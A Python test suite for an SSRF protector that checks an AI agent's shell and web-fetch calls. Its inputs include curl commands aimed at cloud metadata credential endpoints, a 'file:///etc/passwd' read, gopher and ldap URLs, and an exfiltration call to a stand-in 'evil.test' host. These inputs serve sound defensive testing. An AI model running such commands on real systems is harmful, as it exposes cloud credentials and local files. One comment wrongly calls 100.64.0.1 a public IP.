#!/usr/bin/env python3
"""
Tests for SSRF (Server-Side Request Forgery) Protection

Tests cover:
- Hermes Security Framework validated payloads (2/2 for SSRF)
- Private IP ranges (RFC 1918, loopback, link-local)
- Cloud metadata endpoints (AWS, GCP, Azure)
- Dangerous URL schemes
- IPv6 support
- Edge cases (quoted URLs, piped commands, multiple URLs)
- False positives (public IPs, AWS services)
- Action modes (block/warn/log-only)
- Configuration overrides
"""

import pytest
from ai_guardian.scanners.ssrf import SSRFProtector, check_ssrf


class TestSSRFProtectorCore:
    """Core SSRF protection tests."""

    def test_disabled_protection(self):
        """Test that protection can be disabled."""
        protector = SSRFProtector({"enabled": False})
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254"}
        )
        assert not should_block
        assert msg is None

    def test_non_bash_tool_allowed(self):
        """Test that non-Bash tools are not checked for SSRF."""
        protector = SSRFProtector()
        should_block, msg = protector.check("Read", {"file_path": "/tmp/test.txt"})
        assert not should_block
        assert msg is None

    def test_empty_command(self):
        """Test that empty commands are allowed."""
        protector = SSRFProtector()
        should_block, msg = protector.check("Bash", {"command": ""})
        assert not should_block
        assert msg is None

    def test_command_without_urls(self):
        """Test that commands without URLs are allowed."""
        protector = SSRFProtector()
        should_block, msg = protector.check("Bash", {"command": "ls -la /tmp"})
        assert not should_block
        assert msg is None


class TestHermesValidatedPayloads:
    """
    Test cases from Hermes Security Framework.

    These are real-world attack payloads validated by the Hermes framework.
    AI Guardian must block all of these.
    """

    def test_hermes_payload_1_aws_metadata(self):
        """Hermes payload #1: AWS metadata endpoint access."""
        protector = SSRFProtector()

        # Direct metadata endpoint access
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254/latest/meta-data/"}
        )

        assert should_block, "Failed to block AWS metadata endpoint (Hermes payload #1)"
        assert "SSRF" in msg
        assert "169.254.169.254" in msg

    def test_hermes_payload_2_url_redirect(self):
        """Hermes payload #2: URL redirect to metadata endpoint."""
        protector = SSRFProtector()

        # While we can't detect redirects (requires network access),
        # we should block direct metadata endpoint references
        should_block, msg = protector.check(
            "Bash",
            {
                "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
        )

        assert (
            should_block
        ), "Failed to block metadata credentials endpoint (Hermes payload #2)"
        assert "169.254.169.254" in msg


class TestPrivateIPRanges:
    """Test blocking of private IP ranges (RFC 1918, loopback, link-local)."""

    @pytest.mark.parametrize(
        "ip,description",
        [
            ("10.0.0.1", "10.0.0.0/8 - Private network"),
            ("10.255.255.255", "10.0.0.0/8 - Last address"),
            ("172.16.0.1", "172.16.0.0/12 - Private network"),
            ("172.31.255.255", "172.16.0.0/12 - Last address"),
            ("192.168.0.1", "192.168.0.0/16 - Private network"),
            ("192.168.255.255", "192.168.0.0/16 - Last address"),
            ("127.0.0.1", "127.0.0.0/8 - Loopback"),
            ("127.255.255.255", "127.0.0.0/8 - Last loopback"),
            ("169.254.169.254", "169.254.0.0/16 - AWS metadata"),
            ("169.254.0.1", "169.254.0.0/16 - Link-local"),
        ],
    )
    def test_private_ipv4_blocked(self, ip, description):
        """Test that private IPv4 addresses are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": f"curl http://{ip}/test"}
        )

        assert should_block, f"Failed to block {description}"
        assert ip in msg

    @pytest.mark.parametrize(
        "ip,description",
        [
            ("::1", "IPv6 loopback"),
            ("fc00::1", "IPv6 private - fc00::/7"),
            ("fd00::1", "IPv6 private - fd00::/8"),
            ("fe80::1", "IPv6 link-local"),
        ],
    )
    def test_private_ipv6_blocked(self, ip, description):
        """Test that private IPv6 addresses are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": f"curl http://[{ip}]/test"}
        )

        assert should_block, f"Failed to block {description}"

    @pytest.mark.parametrize(
        "ipv6_mapped,expected_ipv4,description",
        [
            (
                "::ffff:169.254.169.254",
                "169.254.169.254",
                "AWS metadata via IPv6-mapped",
            ),
            ("::ffff:127.0.0.1", "127.0.0.1", "Loopback via IPv6-mapped"),
            ("::ffff:10.0.0.1", "10.0.0.1", "Private 10.x via IPv6-mapped"),
            ("::ffff:172.16.0.1", "172.16.0.1", "Private 172.16.x via IPv6-mapped"),
            ("::ffff:192.168.1.1", "192.168.1.1", "Private 192.168.x via IPv6-mapped"),
        ],
    )
    def test_ipv6_mapped_ipv4_blocked(self, ipv6_mapped, expected_ipv4, description):
        """Test that IPv6-mapped IPv4 addresses are blocked (CVE-level bypass fix)."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": f"curl http://[{ipv6_mapped}]/test"}
        )

        assert should_block, f"Failed to block {description} (maps to {expected_ipv4})"
        assert "SSRF" in msg or "blocked" in msg.lower()


class TestCloudMetadataEndpoints:
    """Test blocking of cloud provider metadata endpoints."""

    @pytest.mark.parametrize(
        "endpoint,provider",
        [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/latest/user-data", "AWS"),
            ("http://metadata.google.internal/", "GCP"),
            ("http://metadata.goog/", "GCP alternative"),
            ("http://[fd00:ec2::254]/", "AWS IPv6"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud"),
            ("http://192.0.0.192/opc/v2/instance/", "Oracle Cloud"),
        ],
    )
    def test_metadata_endpoints_blocked(self, endpoint, provider):
        """Test that cloud metadata endpoints are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check("Bash", {"command": f"curl {endpoint}"})

        assert should_block, f"Failed to block {provider} metadata endpoint"
        assert "SSRF" in msg

    def test_alibaba_cloud_metadata_blocked_via_webfetch(self):
        """Alibaba Cloud metadata blocked for WebFetch tool calls."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "WebFetch", {"url": "http://100.100.100.200"}
        )

        assert should_block, "Failed to block Alibaba Cloud metadata via WebFetch"
        assert "SSRF" in msg

    def test_unrelated_100x_public_ip_not_blocked(self):
        """Unrelated 100.x public IPs must not be blocked (only 100.100.100.200 is metadata)."""
        protector = SSRFProtector()
        should_block, _ = protector.check(
            "Bash", {"command": "curl http://100.64.0.1/"}
        )

        assert not should_block, "100.64.0.1 is a public IP and must not be blocked"

    def test_localhost_domain_blocked_by_default(self):
        """Test that localhost domain is blocked by default."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:8080/admin"}
        )

        assert should_block
        assert "localhost" in msg


class TestDangerousURLSchemes:
    """Test blocking of dangerous URL schemes."""

    @pytest.mark.parametrize(
        "scheme", ["file", "gopher", "ftp", "ftps", "data", "dict", "ldap", "ldaps"]
    )
    def test_dangerous_scheme_blocked(self, scheme):
        """Test that dangerous URL schemes are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": f"{scheme}://example.com/test"}
        )

        assert should_block, f"Failed to block {scheme}:// scheme"
        assert scheme in msg.lower()

    def test_file_scheme_local_path(self):
        """Test that file:// URLs are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl file:///etc/passwd"}
        )

        assert should_block
        assert "file://" in msg.lower()

    def test_data_url_scheme(self):
        """Test that data: URLs are blocked."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl data:text/plain,hello"}
        )

        assert should_block
        assert "data://" in msg.lower()


class TestEdgeCases:
    """Test edge cases and complex scenarios."""

    def test_quoted_url(self):
        """Test URL extraction from quoted strings."""
        protector = SSRFProtector()

        # Single quotes
        should_block, msg = protector.check(
            "Bash", {"command": "curl 'http://169.254.169.254/meta-data'"}
        )
        assert should_block

        # Double quotes
        should_block, msg = protector.check(
            "Bash", {"command": 'curl "http://169.254.169.254/meta-data"'}
        )
        assert should_block

    def test_piped_command_with_url(self):
        """Test URL extraction from piped commands."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://10.0.0.1/test | jq .data"}
        )

        assert should_block
        assert "10.0.0.1" in msg

    def test_multiple_urls_in_command(self):
        """Test commands with multiple URLs."""
        protector = SSRFProtector()

        # One private, one public
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://example.com && curl http://192.168.1.1"}
        )

        assert should_block
        assert "192.168.1.1" in msg

    def test_wget_command(self):
        """Test wget commands with private IPs."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "wget http://172.16.0.1/file.txt"}
        )

        assert should_block
        assert "172.16.0.1" in msg

    def test_curl_with_flags(self):
        """Test curl with various flags and options."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash",
            {
                "command": "curl -X POST -H 'Content-Type: application/json' http://127.0.0.1:8080/api"
            },
        )

        assert should_block
        assert "127.0.0.1" in msg

    def test_url_flag_format(self):
        """Test --url flag format."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl --url http://10.10.10.10/data"}
        )

        assert should_block


class TestFalsePositives:
    """Test that legitimate public URLs are NOT blocked."""

    @pytest.mark.parametrize(
        "url",
        [
            "http://example.com",
            "https://www.google.com",
            "https://api.github.com/repos",
            "https://s3.amazonaws.com/bucket/file.txt",
            "https://storage.googleapis.com/bucket/object",
            "http://8.8.8.8",  # Google DNS
            "https://1.1.1.1",  # Cloudflare DNS
            "https://registry.npmjs.org/package",
        ],
    )
    def test_public_url_allowed(self, url):
        """Test that public URLs are allowed."""
        protector = SSRFProtector()
        should_block, msg = protector.check("Bash", {"command": f"curl {url}"})

        assert not should_block, f"Incorrectly blocked legitimate URL: {url}"

    def test_public_aws_service(self):
        """Test that public AWS services are NOT blocked."""
        protector = SSRFProtector()

        # S3
        should_block, msg = protector.check(
            "Bash", {"command": "curl https://s3.amazonaws.com/mybucket/file.txt"}
        )
        assert not should_block

        # EC2 API (public)
        should_block, msg = protector.check(
            "Bash", {"command": "aws ec2 describe-instances"}
        )
        assert not should_block  # No URL extracted from this command

    def test_https_urls_allowed(self):
        """Test that HTTPS URLs to public domains are allowed."""
        protector = SSRFProtector()
        should_block, msg = protector.check(
            "Bash", {"command": "curl https://api.openai.com/v1/models"}
        )

        assert not should_block


class TestActionModes:
    """Test different action modes (block/warn/log-only)."""

    def test_block_mode_default(self):
        """Test block mode (default) prevents execution."""
        protector = SSRFProtector({"action": "block"})
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254"}
        )

        assert should_block
        assert "BLOCKED" in msg
        assert "SSRF" in msg

    def test_warn_mode_allows_with_warning(self):
        """Test warn mode logs but allows execution for configurable patterns."""
        protector = SSRFProtector(
            {
                "action": "warn",
                "additional_blocked_domains": ["evil.test"],
            }
        )
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://evil.test/exfil"}
        )

        assert not should_block  # Execution allowed for configurable pattern
        assert msg is not None  # But warning shown
        assert "⚠️" in msg
        assert "SSRF" in msg
        assert "warn mode" in msg.lower()

    def test_log_only_mode_no_agent_message(self):
        """Test log-only mode allows execution with no agent-facing message."""
        protector = SSRFProtector(
            {
                "action": "log-only",
                "additional_blocked_domains": ["evil.test"],
            }
        )
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://evil.test/exfil"}
        )

        assert not should_block  # Execution allowed
        assert msg is None  # No message sent to agent

    def test_immutable_pattern_blocks_in_warn_mode(self):
        """Immutable SSRF patterns (metadata endpoints) always block regardless of action mode."""
        protector = SSRFProtector({"action": "warn"})
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254/latest/meta-data/"}
        )

        assert should_block, "Immutable pattern must block even in warn mode"
        assert msg is not None
        assert "immutable" in msg.lower()

    def test_immutable_pattern_blocks_in_log_only_mode(self):
        """Immutable SSRF patterns always block regardless of log-only action mode."""
        protector = SSRFProtector({"action": "log-only"})
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254"}
        )

        assert should_block, "Immutable pattern must block even in log-only mode"
        assert msg is not None

    def test_immutable_dangerous_scheme_blocks_in_warn_mode(self):
        """Dangerous URL schemes are immutable and always block."""
        protector = SSRFProtector({"action": "warn"})
        should_block, msg = protector.check(
            "Bash", {"command": "curl file:///etc/passwd"}
        )

        assert should_block, "Dangerous scheme must block even in warn mode"

    def test_immutable_private_ip_blocks_in_log_only_mode(self):
        """Private IP ranges are immutable and always block."""
        protector = SSRFProtector({"action": "log-only"})
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://10.0.0.1/admin"}
        )

        assert should_block, "Private IP must block even in log-only mode"


class TestConfigurationOverrides:
    """Test configuration overrides and customization."""

    def test_additional_blocked_ips(self):
        """Test additional IP addresses can be blocked."""
        protector = SSRFProtector(
            {"additional_blocked_ips": ["203.0.113.0/24"]}  # TEST-NET-3
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://203.0.113.5"}
        )

        assert should_block
        assert "203.0.113.5" in msg

    def test_additional_blocked_domains(self):
        """Test additional domains can be blocked."""
        protector = SSRFProtector(
            {"additional_blocked_domains": ["internal.example.com", "admin.local"]}
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://internal.example.com/api"}
        )

        assert should_block
        assert "internal.example.com" in msg

    def test_allow_localhost_override(self):
        """Test that localhost can be allowed for local development."""
        protector = SSRFProtector({"allow_localhost": True})

        # Localhost domain
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:3000"}
        )
        assert not should_block

        # Localhost IP
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://127.0.0.1:8080"}
        )
        assert not should_block

    def test_localhost_blocked_by_default(self):
        """Test that localhost is blocked when allow_localhost is False."""
        protector = SSRFProtector({"allow_localhost": False})

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:3000"}
        )
        assert should_block


class TestAllowedDomains:
    """Test allowed_domains allow-list functionality (Issue #252)."""

    def test_allowed_domain_overrides_additional_blocked_domain(self):
        """Test that allowed_domains can override additional_blocked_domains."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": [
                    "api.corp.internal",
                    "public.corp.internal",
                    "other.corp.internal",
                ],
                "allowed_domains": ["api.corp.internal", "public.corp.internal"],
            }
        )

        # api.corp.internal should be allowed (in allow-list)
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal/data"}
        )
        assert (
            not should_block
        ), "allowed_domains should override additional_blocked_domains"

        # public.corp.internal should be allowed
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://public.corp.internal/info"}
        )
        assert not should_block

        # other.corp.internal should be blocked (not in allow-list)
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://other.corp.internal/secret"}
        )
        assert should_block, "Domains not in allow-list should remain blocked"

    def test_allowed_domain_subdomain_matching(self):
        """Test that allowed_domains supports subdomain matching."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": [
                    "api.corp.internal",
                    "v1.api.corp.internal",
                    "admin.corp.internal",
                ],
                "allowed_domains": ["api.corp.internal"],
            }
        )

        # Exact match
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal"}
        )
        assert not should_block

        # Subdomain of allowed domain
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://v1.api.corp.internal/endpoint"}
        )
        assert not should_block, "Subdomains of allowed domains should be allowed"

        # Different subdomain not in allow-list
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.corp.internal"}
        )
        assert should_block

    def test_allowed_domain_cannot_override_core_metadata_endpoints(self):
        """Test that allowed_domains CANNOT override immutable core protections."""
        protector = SSRFProtector(
            {
                "allowed_domains": [
                    "metadata.google.internal",
                    "169.254.169.254",
                    "fd00:ec2::254",
                ]
            }
        )

        # Core metadata endpoints should ALWAYS be blocked
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.google.internal"}
        )
        assert (
            should_block
        ), "Core metadata endpoints cannot be overridden by allow-list"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254/latest/meta-data"}
        )
        assert should_block, "AWS metadata endpoint cannot be overridden"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://[fd00:ec2::254]/"}
        )
        assert should_block, "AWS IPv6 metadata cannot be overridden"

    def test_allowed_domain_cannot_override_dangerous_schemes(self):
        """Test that allowed_domains cannot override dangerous URL schemes."""
        protector = SSRFProtector({"allowed_domains": ["example.com"]})

        # Dangerous schemes should always be blocked
        should_block, msg = protector.check(
            "Bash", {"command": "file://example.com/etc/passwd"}
        )
        assert should_block, "Dangerous schemes cannot be overridden"

        should_block, msg = protector.check("Bash", {"command": "gopher://example.com"})
        assert should_block

    def test_allowed_domain_with_localhost(self):
        """Test allowed_domains interaction with allow_localhost."""
        # With allow_localhost=False, localhost is blocked
        protector = SSRFProtector(
            {"allow_localhost": False, "allowed_domains": ["localhost"]}
        )

        # localhost domain should still be blocked (it's in CORE_BLOCKED_DOMAINS)
        # Note: localhost is treated specially and removed from blocked list when allow_localhost=True
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:8080"}
        )
        # This should NOT be blocked because allowed_domains can override the localhost block
        # when allow_localhost=False (localhost is in additional blocked list, not immutable core)
        assert (
            not should_block
        ), "allowed_domains should allow localhost when in allow-list"

    def test_allowed_domain_empty_list(self):
        """Test that empty allowed_domains list works correctly."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["internal.example.com"],
                "allowed_domains": [],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://internal.example.com"}
        )
        assert should_block, "Empty allow-list should not affect blocking"

    def test_allowed_domain_case_insensitive(self):
        """Test that domain matching is case-insensitive."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["Api.Corp.Internal"],
                "allowed_domains": ["API.Corp.Internal"],
            }
        )

        # Lowercase variant
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal"}
        )
        assert not should_block

        # Uppercase variant
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://API.CORP.INTERNAL"}
        )
        assert not should_block

        # Mixed case
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://Api.Corp.Internal"}
        )
        assert not should_block

    def test_allowed_domain_with_multiple_urls(self):
        """Test allowed_domains with commands containing multiple URLs."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["api.internal", "admin.internal"],
                "allowed_domains": ["api.internal"],
            }
        )

        # One allowed, one blocked
        should_block, msg = protector.check(
            "Bash",
            {"command": "curl http://api.internal && curl http://admin.internal"},
        )
        assert should_block, "Should block if any URL is blocked"
        assert "admin.internal" in msg

        # Both allowed
        should_block, msg = protector.check(
            "Bash",
            {"command": "curl http://api.internal && curl http://v2.api.internal"},
        )
        assert not should_block, "Should allow if all URLs are allowed"

    def test_allowed_domain_does_not_affect_private_ips(self):
        """Test that allowed_domains only affects domain blocking, not IP blocking."""
        protector = SSRFProtector({"allowed_domains": ["10.0.0.1", "192.168.1.1"]})

        # Private IPs should still be blocked (immutable core protection)
        should_block, msg = protector.check("Bash", {"command": "curl http://10.0.0.1"})
        assert (
            should_block
        ), "Private IPs are immutable protection, cannot be overridden"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://192.168.1.1"}
        )
        assert should_block


class TestAllowedDomainsRegex:
    """Test regex pattern support in allowed_domains (Issue #1134)."""

    def test_regex_subdomain_wildcard(self):
        """Regex '.*\\.example\\.com' matches subdomains of example.com."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.example.com"],
                "allowed_domains": [".*\\.example\\.com"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.example.com/data"}
        )
        assert not should_block, "Regex subdomain pattern should allow api.example.com"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://deep.sub.example.com"}
        )
        assert not should_block, "Regex should match multi-level subdomains"

    def test_regex_specific_port(self):
        """Regex 'localhost:19200' matches only that port."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["localhost"],
                "allowed_domains": ["localhost:19200"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:19200/api"}
        )
        assert not should_block, "localhost:19200 should be allowed"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:9999/api"}
        )
        assert should_block, "Other ports on localhost should remain blocked"

    def test_regex_port_range(self):
        """Regex 'localhost:\\d+' matches any port on localhost."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["localhost"],
                "allowed_domains": ["localhost:\\d+"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:8080/health"}
        )
        assert not should_block, "Any port should match \\d+"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:3000"}
        )
        assert not should_block

    def test_regex_port_alternation(self):
        """Regex 'localhost:(19200|8080)' matches specific ports."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["localhost"],
                "allowed_domains": ["localhost:(19200|8080)"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:19200"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:8080"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:9999"}
        )
        assert should_block, "Non-matching port should remain blocked"

    def test_regex_character_class(self):
        """Regex 'cdn-[0-9]{2}\\.fastly\\.net' matches numbered CDN nodes."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.fastly.net"],
                "allowed_domains": ["cdn-[0-9]{2}\\.fastly\\.net"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://cdn-01.fastly.net/asset.js"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://cdn-99.fastly.net/asset.js"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://cdn-abc.fastly.net/asset.js"}
        )
        assert should_block, "Non-numeric CDN node should remain blocked"

    def test_regex_multi_level_wildcard(self):
        """Regex 'api\\.internal\\..*\\.corp\\.net' matches multi-level domains."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.corp.net"],
                "allowed_domains": ["api\\.internal\\..*\\.corp\\.net"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.internal.us.corp.net"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.internal.us.corp.net"}
        )
        assert should_block, "Different subdomain prefix should remain blocked"

    def test_plain_strings_backward_compatible(self):
        """Plain domain strings without regex metacharacters work as before."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["api.corp.internal"],
                "allowed_domains": ["api.corp.internal"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal/data"}
        )
        assert not should_block, "Exact match should still work"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://sub.api.corp.internal/data"}
        )
        assert not should_block, "Subdomain match should still work"

    def test_invalid_regex_warns_and_skips(self):
        """Invalid regex patterns emit warning and are skipped, not crash."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["evil.com"],
                "allowed_domains": ["[invalid regex", "api\\.good\\.com"],
            }
        )

        # Should not crash during construction
        assert len(protector._allowed_domain_regexes) == 1, "Valid regex should be kept"

        # Valid regex should still work
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.good.com/data"}
        )
        assert not should_block

    def test_regex_cannot_override_immutable_protections(self):
        """Regex patterns CANNOT override immutable core protections."""
        protector = SSRFProtector(
            {
                "allowed_domains": [
                    "metadata\\.google\\.internal",
                    "169\\.254\\.169\\.254",
                    ".*",
                ]
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.google.internal"}
        )
        assert should_block, "Core metadata cannot be overridden by regex"

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://169.254.169.254/latest"}
        )
        assert should_block, "AWS metadata cannot be overridden by regex"

    def test_mixed_exact_and_regex(self):
        """Config with both exact strings and regex patterns works correctly."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.internal.com", "localhost"],
                "allowed_domains": [
                    "api.internal.com",
                    ".*\\.staging\\.internal\\.com",
                    "localhost:3000",
                ],
            }
        )

        # Exact match
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.internal.com"}
        )
        assert not should_block

        # Regex match
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://app.staging.internal.com"}
        )
        assert not should_block

        # Regex port match
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://localhost:3000/health"}
        )
        assert not should_block

        # Not in any allow pattern
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.internal.com"}
        )
        assert should_block

    def test_regex_case_insensitive(self):
        """Regex matching is case-insensitive."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.example.com"],
                "allowed_domains": ["api\\.example\\.com"],
            }
        )

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://API.EXAMPLE.COM/data"}
        )
        assert not should_block, "Regex should match case-insensitively"

    def test_regex_fullmatch_not_partial(self):
        """Regex uses fullmatch, not partial search — prevents over-matching."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["evil.example.com"],
                "allowed_domains": ["example\\.com"],
            }
        )

        # "example.com" regex should NOT match "evil.example.com" via fullmatch
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://evil.example.com"}
        )
        assert should_block, "fullmatch should not match partial domains"


class TestConvenienceFunction:
    """Test the convenience function check_ssrf()."""

    def test_check_ssrf_function(self):
        """Test check_ssrf convenience function."""
        should_block, msg = check_ssrf(
            "Bash",
            {"command": "curl http://169.254.169.254"},
            {"enabled": True, "action": "block"},
        )

        assert should_block
        assert "SSRF" in msg

    def test_check_ssrf_with_disabled_config(self):
        """Test check_ssrf with disabled protection."""
        should_block, msg = check_ssrf(
            "Bash", {"command": "curl http://169.254.169.254"}, {"enabled": False}
        )

        assert not should_block
        assert msg is None


class TestURLExtraction:
    """Test URL extraction from various command formats."""

    def test_extract_basic_url(self):
        """Test extraction of basic HTTP URL."""
        protector = SSRFProtector()
        urls = protector._extract_urls("curl http://example.com")

        assert len(urls) > 0
        assert "http://example.com" in urls

    def test_extract_https_url(self):
        """Test extraction of HTTPS URL."""
        protector = SSRFProtector()
        urls = protector._extract_urls("wget https://secure.example.com/file.txt")

        assert len(urls) > 0
        assert any("https://secure.example.com" in url for url in urls)

    def test_extract_multiple_urls(self):
        """Test extraction of multiple URLs from one command."""
        protector = SSRFProtector()
        urls = protector._extract_urls(
            "curl http://api.example.com && wget https://files.example.com/data.json"
        )

        assert len(urls) >= 2

    def test_no_urls_extracted_from_safe_command(self):
        """Test that no URLs are extracted from commands without URLs."""
        protector = SSRFProtector()
        urls = protector._extract_urls("ls -la /var/log")

        assert len(urls) == 0


class TestIPValidation:
    """Test IP address validation logic."""

    def test_is_ip_blocked_private(self):
        """Test that private IPs are identified correctly."""
        protector = SSRFProtector()

        assert protector._is_ip_blocked("10.0.0.1")
        assert protector._is_ip_blocked("172.16.0.1")
        assert protector._is_ip_blocked("192.168.1.1")
        assert protector._is_ip_blocked("127.0.0.1")
        assert protector._is_ip_blocked("169.254.169.254")

    def test_is_ip_blocked_public(self):
        """Test that public IPs are NOT blocked."""
        protector = SSRFProtector()

        assert not protector._is_ip_blocked("8.8.8.8")
        assert not protector._is_ip_blocked("1.1.1.1")
        assert not protector._is_ip_blocked("151.101.1.140")  # GitHub

    def test_is_ip_blocked_invalid(self):
        """Test handling of invalid IP addresses."""
        protector = SSRFProtector()

        # Invalid IPs should return False (not treated as blocked IPs)
        assert not protector._is_ip_blocked("not-an-ip")
        assert not protector._is_ip_blocked("999.999.999.999")

    def test_is_ip_blocked_ipv6_mapped_ipv4(self):
        """Test that IPv6-mapped IPv4 addresses are properly blocked."""
        protector = SSRFProtector()

        # Critical bypass vulnerability: IPv6-mapped IPv4 addresses
        # These should be blocked when their IPv4 equivalent is blocked
        assert protector._is_ip_blocked(
            "::ffff:169.254.169.254"
        ), "AWS metadata bypass via IPv6-mapped"
        assert protector._is_ip_blocked(
            "::ffff:127.0.0.1"
        ), "Loopback bypass via IPv6-mapped"
        assert protector._is_ip_blocked(
            "::ffff:10.0.0.1"
        ), "Private 10.x bypass via IPv6-mapped"
        assert protector._is_ip_blocked(
            "::ffff:172.16.0.1"
        ), "Private 172.16.x bypass via IPv6-mapped"
        assert protector._is_ip_blocked(
            "::ffff:192.168.1.1"
        ), "Private 192.168.x bypass via IPv6-mapped"

        # Public IPs should still not be blocked even when IPv6-mapped
        assert not protector._is_ip_blocked(
            "::ffff:8.8.8.8"
        ), "Public IP via IPv6-mapped should be allowed"


class TestDomainValidation:
    """Test domain name validation logic."""

    def test_is_domain_blocked_metadata(self):
        """Test that metadata domains are blocked."""
        protector = SSRFProtector()

        assert protector._is_domain_blocked("metadata.google.internal")
        assert protector._is_domain_blocked("metadata.goog")
        assert protector._is_domain_blocked("169.254.169.254")

    def test_is_domain_blocked_subdomain(self):
        """Test that subdomains of blocked domains are also blocked."""
        protector = SSRFProtector()

        # Subdomain of blocked domain
        assert protector._is_domain_blocked("api.metadata.google.internal")

    def test_is_domain_blocked_public(self):
        """Test that public domains are NOT blocked."""
        protector = SSRFProtector()

        assert not protector._is_domain_blocked("example.com")
        assert not protector._is_domain_blocked("google.com")
        assert not protector._is_domain_blocked("github.com")


class TestErrorHandling:
    """Test error handling and fail-closed behavior."""

    def test_malformed_url_fails_closed(self):
        """Test that malformed URLs fail closed (blocked)."""
        protector = SSRFProtector()

        # Malformed URL should be blocked
        should_block, msg = protector.check(
            "Bash", {"command": "curl ht!tp://malformed"}
        )

        # Should either block or ignore (depending on parsing)
        # The key is it should NOT crash
        assert isinstance(should_block, bool)

    def test_missing_command_parameter(self):
        """Test handling of missing command parameter."""
        protector = SSRFProtector()

        should_block, msg = protector.check("Bash", {})

        assert not should_block  # Empty command, nothing to check
        assert msg is None


